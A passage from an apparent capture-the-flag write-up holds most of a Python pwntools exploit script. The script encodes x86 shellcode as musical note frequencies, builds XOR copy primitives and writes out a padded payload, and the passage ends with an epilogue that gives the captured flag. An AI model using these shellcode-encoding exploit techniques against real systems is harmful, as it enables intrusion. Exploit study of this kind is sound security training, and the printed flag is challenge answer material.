                    print('mem', hex(available_bits[i]))
                    shellcode += ebpgadgets[i]

            print(steps)
            return shellcode, position

        except:
            #print("unsat")
            shellcode += incebp * 2
            position += 4
            steps += 1


    raise Exception("not solvable!")


binshaddr = 0x40404a4f

shellcode = asm(shellcraft.execve('/bin/ls', [''], []))

NOP = 'B7'    #inc edx; aaa ;
DNOP = 'G#7'    #inc edi; and esi, dword ptr [edi]; 

n_to_f = {'G#1': 101, 'G#0': 51, 'G#3': 404, 'G#2': 202, 'G#5': 1614, 'G#4': 807, 'G#7': 6456, 'G#6': 3228, 'G#9': 25823, 'G#8': 12912, 'G7': 6094, 'G6': 3047, 'G5': 1524, 'G4': 762, 'G3': 381, 'G2': 191, 'G1': 96, 'G0': 48, 'G9': 24374, 'G8': 12187, 'D#8': 9673, 'D#9': 19346, 'D#6': 2419, 'A8': 6840, 'B4': 480, 'B5': 960, 'B6': 1920, 'B7': 3839, 'B0': 30, 'B1': 60, 'B2': 120, 'B3': 240, 'B8': 7678, 'B9': 15355, 'F#0': 45, 'F#1': 90, 'F#2': 180, 'F#3': 360, 'F#4': 719, 'F#5': 1438, 'F#6': 2876, 'F#7': 5752, 'F#8': 11503, 'F#9': 23006, 'E9': 20496, 'E8': 10248, 'E5': 1281, 'E4': 641, 'E7': 5124, 'E6': 2562, 'E1': 81, 'E0': 41, 'E3': 321, 'E2': 161, 'A#3': 227, 'A#2': 114, 'A#1': 57, 'A#0': 29, 'A#7': 3624, 'A#6': 1812, 'A#5': 906, 'A#4': 453, 'A#9': 14493, 'A#8': 7247, 'C9': 16268, 'C8': 8134, 'C3': 255, 'C2': 128, 'C1': 64, 'C0': 32, 'C7': 4067, 'C6': 2034, 'C5': 1017, 'C4': 509, 'F0': 43, 'F1': 85, 'F2': 170, 'F3': 340, 'F4': 679, 'F5': 1358, 'F6': 2715, 'F7': 5429, 'F8': 10858, 'F9': 21715, 'A1': 54, 'A0': 27, 'A3': 214, 'A2': 107, 'A5': 855, 'A4': 428, 'A7': 3420, 'A6': 1710, 'A9': 13680, 'D#7': 4837, 'D#4': 605, 'D#5': 1210, 'D#2': 152, 'D#3': 303, 'D#0': 38, 'D#1': 76, 'C#9': 17235, 'C#8': 8618, 'C#5': 1078, 'C#4': 539, 'C#7': 4309, 'C#6': 2155, 'C#1': 68, 'C#0': 34, 'C#3': 270, 'C#2': 135, 'D8': 9130, 'D9': 18260, 'D6': 2283, 'D7': 4565, 'D4': 571, 'D5': 1142, 'D2': 143, 'D3': 286, 'D0': 36, 'D1': 72}

def encoder(note):
    r = ""
    i = 0
    while i < len(note):
        #print note[i:i+2]
        if i+2 <= len(note) and note[i:i+2] in n_to_f:
            r += p16(n_to_f[note[i:i+2]])
            i += 2
        elif i+3 <= len(note) and note[i:i+3] in n_to_f:
            r += p16(n_to_f[note[i:i+3]])
            i += 3
        else: raise RuntimeError(str(i))
    return r

MASK1 = 0x40404800
MASK2 = 0x60606800

payload = ""

SETEAX = set_eax(0x40404a4b, 0x0)
md = Cs(CS_ARCH_X86, CS_MODE_32)
baseaddr = 0x60606000

def disasm(code, address):
    instructions = ''
    regex = r'ptr \[e[bcd]x'
    size = 0
    for i in md.disasm(code, address):
        size += i.size
        instructions += '%s %s; ' % (i.mnemonic, i.op_str)
        if re.findall(regex, i.op_str):
            return None

    if size != len(code):
        return None

    return instructions


# SET_EAX = ['D5', 'G6', 'E4', 'D5', 'E0', 'D1', 'B3', 'G8', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'B3', 'G8', 'G8', 'G0', 'G8', 'G0', 'B3', 'G8']
#set eax to 0x40404a4b (== &mask1)
payload += encoder("".join(SETEAX))


payload += encoder('C#8')   #inc ebx; and edi, dword ptr [eax]; eax must point to mask1 0x4040404xxx
payload += encoder('C#7')   #inc ebx; and esi, dword ptr [edi];

# copy primitive assume we're writing to space memset to \x00

COPY = ""
# store the current value of al so we can xor back
COPY += encoder('B0F1')     #inc edx; xor byte ptr [esi + 0x31], al;
COPY += encoder('B2F4')     #inc edx; xor al, byte ptr [esi + 0x34];  next note-nop after three bytes use it to xor happily
# NOP is 2 bytes, we can use this to xor out stuff
COPY += encoder('G2G8')     #inc edi; xor al, byte ptr [edi + 0x38];
COPY += encoder('B0F1')     #inc edx; xor byte ptr [esi + 0x31], al;
COPY += encoder('F7')       #inc esi; aaa;

"""
write must be aligned to "NOTE-NOP" opcodes, we can use a different version of this 
depending on "nop" alignment :)
COPY += encoder('B0F0')     #inc edx; xor byte ptr [esi + 0x30], al;
COPY += encoder('B2F2')     #inc edx; xor al, byte ptr [esi + 0x32];
# NOP is 2 bytes, we can use this to xor out stuff
COPY += encoder('G2G8')     #inc edi; xor al, byte ptr [edi + 0x38];
COPY += encoder('B0F0')     #inc edx; xor byte ptr [esi + 0x30], al;
COPY += encoder('F7')       #inc esi; aaa;
"""

for _ in xrange(len(shellcode)):
    payload += COPY

mask_delta = (0x800 - len(payload) - 2)
n_nops = (mask_delta / 2 )             # a single note is encoded in a word
NOPS = encoder(DNOP) * n_nops
payload += NOPS

payload += "\xff\xff"
# payload += encoder('G3G2')           #inc edi; xor eax, dword ptr [edi + 0x30];

print hex(len(payload))
# mask to let us use \x00 (add    BYTE PTR [eax],al) as nop
payload += 'a' * (0x800 - len(payload))
assert len(payload) == 0x800
payload += p32(MASK2)
payload += 'b' * (0x838 - len(payload))
payload += 'c' + shellcode
payload += 'd' * (0xa4b - len(payload))
payload += p32(MASK1)

payload += '\x00\x00'

#print SETEAX
#print '\n'.join(disasm(''.join(SETEAX), baseaddr).split(';'))

with open('payload','w') as f:
    f.write(payload)

"""
p = process('./nop')
p.sendline(payload)
p.readline()
p.readline()
if r:
    print 'WOOOOOOOOOO %s' % r
"""
```


### Epilogue

We developed the three exploits in parallel.
The Second exploit was the first to be ready, but unfortunately we set the solver to use a `0xff` we found on the stack and it worked in every laptop in the lab but not in remote.....  
The First exploit was the second to be ready and succesfully led us to the flag.  
We finished the Third exploit just beacause we enjoyed the challenge and thought it was an elegant idea!

Oh, the flag was:  
`OOO{1f_U_Ar3_r34d1n6_7h15_y0u_4r3_7h3_m0z4rT_0f_1nf053c_Ch33rs2MP!}`